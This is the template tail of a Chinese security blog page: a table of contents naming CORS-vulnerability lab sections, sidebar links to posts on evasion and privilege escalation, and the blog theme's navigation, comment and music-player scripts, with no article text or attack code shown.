href="#%E5%AE%9E%E9%AA%8C%E4%B8%80-%E5%85%B7%E6%9C%89%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%82%B9%E5%8F%8D%E5%B0%84%E7%9A%84-cors-%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.10.0.1.</span> <span class="toc-text">实验一: 具有基本原点反射的 CORS 漏洞</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E5%AE%A4%E4%BA%8C%E5%8F%97%E4%BF%A1%E4%BB%BB%E7%A9%BA%E6%BA%90%E7%9A%84cors%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.10.0.2.</span> <span class="toc-text">实验室二：受信任空源的CORS漏洞</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E4%B8%89-%E5%8F%97%E4%BF%A1%E4%BB%BB%E7%9A%84%E4%B8%8D%E5%AE%89%E5%85%A8%E5%8D%8F%E8%AE%AE%E7%9A%84cors%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.10.0.3.</span> <span class="toc-text">实验三:  受信任的不安全协议的CORS漏洞</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E5%9B%9B-cors%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%86%85%E9%83%A8%E7%BD%91%E7%BB%9C%E6%9E%A2%E8%BD%B4%E6%94%BB%E5%87%BB"><span class="toc-number">1.10.0.4.</span> <span class="toc-text">实验四: CORS漏洞与内部网络枢轴攻击</span></a></li></ol></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-history"></i><span>最近发布</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/08/thm-yun-xing-shi-gui-bi-jian-ce/" title="THM-运行时规避检测">THM-运行时规避检测</a><time datetime="2024-08-08T14:19:16.000Z" title="发表于 2024-08-08 22:19:16">2024-08-08</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/08/thm-bypass-uac/" title="THM-ByPass_UAC">THM-ByPass_UAC</a><time datetime="2024-08-08T07:36:41.000Z" title="发表于 2024-08-08 15:36:41">2024-08-08</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/07/thm-qian-ming-gui-bi/" title="THM-签名规避">THM-签名规避</a><time datetime="2024-08-07T09:11:33.000Z" title="发表于 2024-08-07 17:11:33">2024-08-07</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/05/windows-ti-quan-zong-jie/" title="Windows提权总结">Windows提权总结</a><time datetime="2024-08-05T02:59:37.000Z" title="发表于 2024-08-05 10:59:37">2024-08-05</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/02/thm-dai-ma-hun-yao-yuan-li/" title="THM-代码混淆原理">THM-代码混淆原理</a><time datetime="2024-08-02T01:46:10.000Z" title="发表于 2024-08-02 09:46:10">2024-08-02</time></div></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"></div><div id="footer-bar"><div class="footer-bar-links"><div class="footer-bar-left"><div id="footer-bar-tips"><div class="copyright">&copy;2020 - 2024 By <a class="footer-bar-link" href="/" title="hybcx" target="_blank">hybcx</a></div></div><div id="footer-type-tips"></div></div><div class="footer-bar-right"><a class="footer-bar-link" target="_blank" rel="noopener" href="https://github.com/anzhiyu-c/hexo-theme-anzhiyu" title="主题">主题</a></div></div></div></footer></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="sidebar-site-data site-data is-center"><a href="/archives/" title="archive"><div class="headline">文章</div><div class="length-num">199</div></a><a href="/tags/" title="tag"><div class="headline">标签</div><div class="length-num">23</div></a><a href="/categories/" title="category"><div class="headline">分类</div><div class="length-num">30</div></a></div><span class="sidebar-menu-item-title">功能</span><div class="sidebar-menu-item"><a class="darkmode_switchbutton menu-child" href="javascript:void(0);" title="显示模式"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span>显示模式</span></a></div><div class="back-menu-list-groups"><div class="back-menu-list-group"><div class="back-menu-list-title">网页</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://blog.anheyu.com/" title="博客"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/img/favicon.ico" alt="博客"/><span class="back-menu-item-text">博客</span></a></div></div><div class="back-menu-list-group"><div class="back-menu-list-title">项目</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="http://yansedaima.com/" title="颜色代码表"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408121908150.svg" alt="颜色代码表"/><span class="back-menu-item-text">颜色代码表</span></a></div></div></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 文章</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/archives/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-box-archive"></use></svg><span> 隧道</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/categories/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-shapes"></use></svg><span> 分类</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/tags/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-tags"></use></svg><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 友链</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/link/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-link"></use></svg><span> 友人帐</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/fcircle/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-artstation"></use></svg><span> 朋友圈</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 我的</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/music/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-music"></use></svg><span> 音乐馆</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 关于</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/about/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-paper-plane"></use></svg><span> 关于本人</span></a></li><li><a class="site-page child faa-parent animated-hover" href="javascript:toRandomPost()"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-shoe-prints1"></use></svg><span> 随便逛逛</span></a></li></ul></div></div><span class="sidebar-menu-item-title">标签</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/CTF%E8%B5%9B%E4%BA%8B/" style="font-size: 0.88rem;">CTF赛事<sup>18</sup></a><a href="/tags/CVE/" style="font-size: 0.88rem;">CVE<sup>15</sup></a><a href="/tags/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="font-size: 0.88rem;">Java反序列化<sup>3</sup></a><a href="/tags/Java%E5%9F%BA%E7%A1%80/" style="font-size: 0.88rem;">Java基础<sup>1</sup></a><a href="/tags/Linux%E6%8F%90%E6%9D%83/" style="font-size: 0.88rem;">Linux提权<sup>2</sup></a><a href="/tags/MISC/" style="font-size: 0.88rem;">MISC<sup>1</sup></a><a href="/tags/Metasploit/" style="font-size: 0.88rem;">Metasploit<sup>3</sup></a><a href="/tags/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 0.88rem;">PHP代码审计<sup>2</sup></a><a href="/tags/SecBook/" style="font-size: 0.88rem;">SecBook<sup>1</sup></a><a href="/tags/TryHackMe/" style="font-size: 0.88rem;">TryHackMe<sup>36</sup></a><a href="/tags/Windows%E6%8F%90%E6%9D%83/" style="font-size: 0.88rem;">Windows提权<sup>2</sup></a><a href="/tags/reverse%E7%B3%BB%E5%88%97/" style="font-size: 0.88rem;">reverse系列<sup>2</sup></a><a href="/tags/tryhackme/" style="font-size: 0.88rem;">tryhackme<sup>1</sup></a><a href="/tags/web%E6%B8%97%E9%80%8F/" style="font-size: 0.88rem;">web渗透<sup>2</sup></a><a href="/tags/web%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93/" style="font-size: 0.88rem;">web知识总结<sup>2</sup></a><a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 0.88rem;">代码审计<sup>1</sup></a><a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" style="font-size: 0.88rem;">内网渗透<sup>3</sup></a><a href="/tags/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA/" style="font-size: 0.88rem;">内网靶场<sup>2</sup></a><a href="/tags/%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86/" style="font-size: 0.88rem;">基本知识<sup>21</sup></a><a href="/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" style="font-size: 0.88rem;">基础知识<sup>1</sup></a><a href="/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/" style="font-size: 0.88rem;">攻防世界<sup>1</sup></a><a href="/tags/%E7%8E%84%E6%9C%BA%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E5%9C%BA/" style="font-size: 0.88rem;">玄机应急响应靶场<sup>1</sup></a><a href="/tags/%E7%BA%A2%E9%98%9F%E6%B8%97%E9%80%8F/" style="font-size: 0.88rem;">红队渗透<sup>1</sup></a></div></div><hr/></div></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="anzhiyufont anzhiyu-icon-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="anzhiyufont anzhiyu-icon-gear"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="anzhiyufont anzhiyu-icon-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="anzhiyufont anzhiyu-icon-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></button></div></div><div id="nav-music"><a id="nav-music-hoverTips" onclick="anzhiyu.musicToggle()" accesskey="m">播放音乐</a><div id="console-music-bg"></div><meting-js id="8152976493" server="netease" type="playlist" mutex="true" preload="none" theme="var(--anzhiyu-main)" data-lrctype="0" order="random" volume="0.7"></meting-js></div><div id="algolia-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><button class="search-close-button"><i class="anzhiyufont anzhiyu-icon-xmark"></i></button></nav><div class="search-wrap"><div id="algolia-search-input"></div><hr/><div id="algolia-search-results"><div id="algolia-hits"></div><div id="algolia-pagination"></div><div id="algolia-info"><div class="algolia-stats"></div><div class="algolia-poweredBy"></div></div></div></div></div><div id="search-mask"></div></div><div id="rightMenu"><div class="rightMenu-group rightMenu-small"><div class="rightMenu-item" id="menu-backward"><i class="anzhiyufont anzhiyu-icon-arrow-left"></i></div><div class="rightMenu-item" id="menu-forward"><i class="anzhiyufont anzhiyu-icon-arrow-right"></i></div><div class="rightMenu-item" id="menu-refresh"><i class="anzhiyufont anzhiyu-icon-arrow-rotate-right" style="font-size: 1rem;"></i></div><div class="rightMenu-item" id="menu-top"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></div></div><div class="rightMenu-group rightMenu-line rightMenuPlugin"><div class="rightMenu-item" id="menu-copytext"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制选中文本</span></div><div class="rightMenu-item" id="menu-pastetext"><i class="anzhiyufont anzhiyu-icon-paste"></i><span>粘贴文本</span></div><a class="rightMenu-item" id="menu-commenttext"><i class="anzhiyufont anzhiyu-icon-comment-medical"></i><span>引用到评论</span></a><div class="rightMenu-item" id="menu-newwindow"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开</span></div><div class="rightMenu-item" id="menu-copylink"><i class="anzhiyufont anzhiyu-icon-link"></i><span>复制链接地址</span></div><div class="rightMenu-item" id="menu-copyimg"><i class="anzhiyufont anzhiyu-icon-images"></i><span>复制此图片</span></div><div class="rightMenu-item" id="menu-downloadimg"><i class="anzhiyufont anzhiyu-icon-download"></i><span>下载此图片</span></div><div class="rightMenu-item" id="menu-newwindowimg"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开图片</span></div><div class="rightMenu-item" id="menu-search"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>站内搜索</span></div><div class="rightMenu-item" id="menu-searchBaidu"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>百度搜索</span></div><div class="rightMenu-item" id="menu-music-toggle"><i class="anzhiyufont anzhiyu-icon-play"></i><span>播放音乐</span></div><div class="rightMenu-item" id="menu-music-back"><i class="anzhiyufont anzhiyu-icon-backward"></i><span>切换到上一首</span></div><div class="rightMenu-item" id="menu-music-forward"><i class="anzhiyufont anzhiyu-icon-forward"></i><span>切换到下一首</span></div><div class="rightMenu-item" id="menu-music-playlist" onclick="window.open(&quot;https://y.qq.com/n/ryqq/playlist/8802438608&quot;, &quot;_blank&quot;);" style="display: none;"><i class="anzhiyufont anzhiyu-icon-radio"></i><span>查看所有歌曲</span></div><div class="rightMenu-item" id="menu-music-copyMusicName"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制歌名</span></div></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item menu-link" id="menu-randomPost"><i class="anzhiyufont anzhiyu-icon-shuffle"></i><span>随便逛逛</span></a><a class="rightMenu-item menu-link" href="/categories/"><i class="anzhiyufont anzhiyu-icon-cube"></i><span>博客分类</span></a><a class="rightMenu-item menu-link" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags"></i><span>文章标签</span></a></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item" id="menu-copy" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制地址</span></a><a class="rightMenu-item" id="menu-commentBarrage" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-message"></i><span class="menu-commentBarrage-text">关闭热评</span></a><a class="rightMenu-item" id="menu-darkmode" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span class="menu-darkmode-text">深色模式</span></a><a class="rightMenu-item" id="menu-translate" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-language"></i><span>轉為繁體</span></a></div></div><div id="rightmenu-mask"></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.cbd.int/medium-zoom@1.1.0/dist/medium-zoom.min.js"></script><script src="https://cdn.cbd.int/instant.page@5.2.0/instantpage.js" type="module"></script><script src="https://cdn.cbd.int/vanilla-lazyload@17.8.5/dist/lazyload.iife.min.js"></script><script src="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.js"></script><canvas id="universe"></canvas><script async src="https://npm.elemecdn.com/anzhiyu-theme-static@1.0.0/dark/dark.js"></script><script>// 消除控制台打印
var HoldLog = console.log;
console.log = function () {};
let now1 = new Date();
queueMicrotask(() => {
  const Log = function () {
    HoldLog.apply(console, arguments);
  }; //在恢复前输出日志
  const grt = new Date("04/01/2021 00:00:00"); //此处修改你的建站时间或者网站上线时间
  now1.setTime(now1.getTime() + 250);
  const days = (now1 - grt) / 1000 / 60 / 60 / 24;
  const dnum = Math.floor(days);
  const ascll = [
    `欢迎使用安知鱼!`,
    `生活明朗, 万物可爱`,
    `
        
       █████╗ ███╗   ██╗███████╗██╗  ██╗██╗██╗   ██╗██╗   ██╗
      ██╔══██╗████╗  ██║╚══███╔╝██║  ██║██║╚██╗ ██╔╝██║   ██║
      ███████║██╔██╗ ██║  ███╔╝ ███████║██║ ╚████╔╝ ██║   ██║
      ██╔══██║██║╚██╗██║ ███╔╝  ██╔══██║██║  ╚██╔╝  ██║   ██║
      ██║  ██║██║ ╚████║███████╗██║  ██║██║   ██║   ╚██████╔╝
      ╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝╚═╝   ╚═╝    ╚═════╝
        
        `,
    "已上线",
    dnum,
    "天",
    "©2020 By 安知鱼 V1.6.12",
  ];
  const ascll2 = [`NCC2-036`, `调用前置摄像头拍照成功，识别为【小笨蛋】.`, `Photo captured: `, `🤪`];

  setTimeout(
    Log.bind(
      console,
      `\n%c${ascll[0]} %c ${ascll[1]} %c ${ascll[2]} %c${ascll[3]}%c ${ascll[4]}%c ${ascll[5]}\n\n%c ${ascll[6]}\n`,
      "color:#425AEF",
      "",
      "color:#425AEF",
      "color:#425AEF",
      "",
      "color:#425AEF",
      ""
    )
  );
  setTimeout(
    Log.bind(
      console,
      `%c ${ascll2[0]} %c ${ascll2[1]} %c \n${ascll2[2]} %c\n${ascll2[3]}\n`,
      "color:white; background-color:#4fd953",
      "",
      "",
      'background:url("https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/tinggge.gif") no-repeat;font-size:450%'
    )
  );

  setTimeout(Log.bind(console, "%c WELCOME %c 你好，小笨蛋.", "color:white; background-color:#4f90d9", ""));

  setTimeout(
    console.warn.bind(
      console,
      "%c ⚡ Powered by 安知鱼 %c 你正在访问 hybcx 的博客.",
      "color:white; background-color:#f0ad4e",
      ""
    )
  );

  setTimeout(Log.bind(console, "%c W23-12 %c 你已打开控制台.", "color:white; background-color:#4f90d9", ""));

  setTimeout(
    console.warn.bind(console, "%c S013-782 %c 你现在正处于监控中.", "color:white; background-color:#d9534f", "")
  );
});</script><script async src="/anzhiyu/random.js"></script><script src="https://cdn.cbd.int/algoliasearch@4.18.0/dist/algoliasearch-lite.umd.js"></script><script src="https://cdn.cbd.int/instantsearch.js@4.60.0/dist/instantsearch.production.min.js"></script><script src="/js/search/algolia.js"></script><div class="js-pjax"><script>(() => {
  const initValine = () => {
    const valine = new Valine(Object.assign({
      el: '#vcomment',
      appId: '7Sc5uZwcoDwvbgqkpwGKyCpN-gzGzoHsz',
      appKey: 'iEFJUGMm2FY91n9ZG1gdKBSy',
      avatar: 'mp',
      serverURLs: '',
      emojiMaps: "",
      path: window.location.pathname,
      visitor: false
    }, null))
  }

  const loadValine = async () => {
    if (typeof Valine === 'function') initValine()
    else {
      await getScript('https://cdn.cbd.int/valine@1.5.1/dist/Valine.min.js')
      initValine()
    }
  }

  if ('Valine' === 'Valine' || !false) {
    if (false) anzhiyu.loadComment(document.getElementById('vcomment'),loadValine)
    else setTimeout(loadValine, 0)
  } else {
    window.loadOtherComment = loadValine
  }
})()</script><input type="hidden" name="page-type" id="page-type" value="post"></div><script src="https://cdn.cbd.int/blueimp-md5@2.19.0/js/md5.min.js"></script><script>window.addEventListener('load', () => {
  const changeContent = (content) => {
    if (content === '') return content

    content = content.replace(/<img.*?src="(.*?)"?[^\>]+>/ig, '[图片]') // replace image link
    content = content.replace(/<a[^>]+?href=["']?([^"']+)["']?[^>]*>([^<]+)<\/a>/gi, '[链接]') // replace url
    content = content.replace(/<pre><code>.*?<\/pre>/gi, '[代码]') // replace code
    content = content.replace(/<[^>]+>/g,"") // remove html tag

    if (content.length > 150) {
      content = content.substring(0,150) + '...'
    }
    return content
  }

  const getIcon = (icon, mail) => {
    if (icon) return icon
    let defaultIcon = '?d=mp'
    let iconUrl = `https://gravatar.loli.net/avatar/${md5(mail.toLowerCase()) + defaultIcon}`
    return iconUrl
  }

  const generateHtml = array => {
    let result = ''

    if (array.length) {
      for (let i = 0; i < array.length; i++) {
        result += '<div class=\'aside-list-item\'>'

        if (true) {
          const name = 'data-lazy-src'
          result += `<a href='${array[i].url}' class='thumbnail'><img ${name}='${array[i].avatar}' alt='${array[i].nick}'></a>`
        }

        result += `<div class='content'>
        <a class='comment' href='${array[i].url}' title='${array[i].content}'>${array[i].content}</a>
        <div class='name'><span>${array[i].nick} / </span><time datetime="${array[i].date}">${anzhiyu.diffDate(array[i].date, true)}</time></div>
        </div></div>`
      }
    } else {
      result += '没有评论'
    }

    let $dom = document.querySelector('#card-newest-comments .aside-list')
    $dom && ($dom.innerHTML= result)
    window.lazyLoadInstance && window.lazyLoadInstance.update()
    window.pjax && window.pjax.refresh($dom)
  }

  const getComment = () => {
    const serverURL = 'https://7Sc5uZwc.api.lncldglobal.com'

    var settings = {
      "method": "GET",
      "headers": {
        "X-LC-Id": '7Sc5uZwcoDwvbgqkpwGKyCpN-gzGzoHsz',
        "X-LC-Key": 'iEFJUGMm2FY91n9ZG1gdKBSy',
        "Content-Type": "application/json"
      },
    }

    fetch(`${serverURL}/1.1/classes/Comment?limit=6&order=-createdAt`,settings)
      .then(response => response.json())
      .then(data => {
        const valineArray = data.results.map(function (e) {
          return {
            'avatar': getIcon(e.QQAvatar, e.mail),
            'content': changeContent(e.comment),
            'nick': e.nick,
            'url': e.url + '#' + e.objectId,
            'date': e.updatedAt,
          }
        })
        saveToLocal.set('valine-newest-comments', JSON.stringify(valineArray), 10/(60*24))
        generateHtml(valineArray)
      }).catch(e => {
        const $dom = document.querySelector('#card-newest-comments .aside-list')
        $dom.textContent= "无法获取评论，请确认相关配置是否正确"
      }) 
  }

  const newestCommentInit = () => {
    if (document.querySelector('#card-newest-comments .aside-list')) {
      const data = saveToLocal.get('valine-newest-comments')
      if (data) {
        generateHtml(JSON.parse(data))
      } else {
        getComment()
      }
    }
  }

  newestCommentInit()
  document.addEventListener('pjax:complete', newestCommentInit)
})</script><script async data-pjax src="https://npm.elemecdn.com/anzhiyu-theme-static@1.0.1/bubble/bubble.js"></script><script>var visitorMail = "";
</script><script async data-pjax src="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/waterfall/waterfall.js"></script><script src="https://lf3-cdn-tos.bytecdntp.com/cdn/expire-1-M/qrcodejs/1.0.0/qrcode.min.js"></script><script src="/js/anzhiyu/right_click_menu.js"></script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.9/icon/ali_iconfont_css.css"><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/aplayer/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.cbd.int/anzhiyu-blog-static@1.0.1/js/APlayer.min.js"></script><script src="https://cdn.cbd.int/hexo-anzhiyu-music@1.0.1/assets/js/Meting2.min.js"></script><script src="https://cdn.cbd.int/pjax@0.2.8/pjax.min.js"></script><script>let pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
var pjax = new Pjax({
  elements: 'a:not([target="_blank"])',
  selectors: pjaxSelectors,
  cacheBust: false,
  analytics: false,
  scrollRestoration: false
})

document.addEventListener('pjax:send', function () {
  // removeEventListener scroll 
  anzhiyu.removeGlobalFnEvent('pjax')
  anzhiyu.removeGlobalFnEvent('themeChange')

  document.getElementById('rightside').classList.remove('rightside-show')
  
  if (window.aplayers) {
    for (let i = 0; i < window.aplayers.length; i++) {
      if (!window.aplayers[i].options.fixed) {
        window.aplayers[i].destroy()
      }
    }
  }

  typeof typed === 'object' && typed.destroy()

  //reset readmode
  const $bodyClassList = document.body.classList
  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
})

document.addEventListener('pjax:complete', function () {
  window.refreshFn()

  document.querySelectorAll('script[data-pjax]').forEach(item => {
    const newScript = document.createElement('script')
    const content = item.text || item.textContent || item.innerHTML || ""
    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
    newScript.appendChild(document.createTextNode(content))
    item.parentNode.replaceChild(newScript, item)
  })

  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()

  typeof panguInit === 'function' && panguInit()

  // google analytics
  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});

  // baidu analytics
  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);

  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()

  // prismjs
  typeof Prism === 'object' && Prism.highlightAll()
})

document.addEventListener('pjax:error', e => {
  if (e.request.status === 404) {
    pjax.loadUrl('/404.html')
  }
})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script charset="UTF-8" src="https://cdn.cbd.int/anzhiyu-theme-static@1.1.5/accesskey/accesskey.js"></script></div><div id="popup-window"><div class="popup-window-title">通知</div><div class="popup-window-divider"></div><div class="popup-window-content"><div class="popup-tip">你好呀</div><div class="popup-link"><i class="anzhiyufont anzhiyu-icon-arrow-circle-right"></i></div></div></div></body></html>